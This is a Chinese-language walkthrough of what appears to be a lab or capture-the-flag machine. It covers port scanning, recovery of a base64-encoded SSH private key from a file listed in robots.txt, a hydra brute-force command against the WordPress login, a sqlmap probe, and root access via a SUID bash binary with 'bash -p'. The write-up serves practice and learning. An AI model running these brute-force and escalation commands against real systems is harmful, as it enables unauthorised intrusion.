## 扫描

> 扫描发现了端口22，80，33060开放，对22端口进行尝试，发现是公钥认证

## WEB枚举
* **web信息收集**
> 	进行简单尝试，发现存在robots.txt 进行查看发现了有一个文件存在secrect.txt
> 	内容为base64加密，进行转储到本地，进行base64解码发现是私钥
* **页面信息收集**
>	用wpscan和cewl收集网站信息，发现用户admin，然后使用hydra进行简单的wordpress后台爆破
>	`hydra 192.168.80.134 -l admin -P /usr/share/wordlist/rockyou.txt http-post-form "/wp-login.php:pwd=^PASS^:error" -e nsr -vV `
>	对页面中存在的搜索框进行手工注入尝试后未发现有注入漏洞，使用sqlmap进行手工查询的补充
>	`sqlmap -u "http://192.168.80.134/?s=a*" --level=3 --dbs`
>	未发现注入点！
>	尝试用私钥进行ssh登录，发现登录成功

## 提权
* 信息枚举
> 	在主机使用`find / -writable -type f 2>/dev/null| grep -v /proc | grep -v /sys`没有发现可以利用的可写文件，在进行目录枚举发现用户家目录有ip这个脚本，对脚本进行查看和尝试，并未发现提权方法
> 	自动任务以及passwd和shadow文件权限都正常，查看这台主机有无suid提权方式`find / -perm -u=s -type f 2>/dev/null `发现了一个可以利用的suid命令/usr/bin/bash
> 		提权： /usr/bin/bash -p

![[Pasted image 20240106151547.png]]
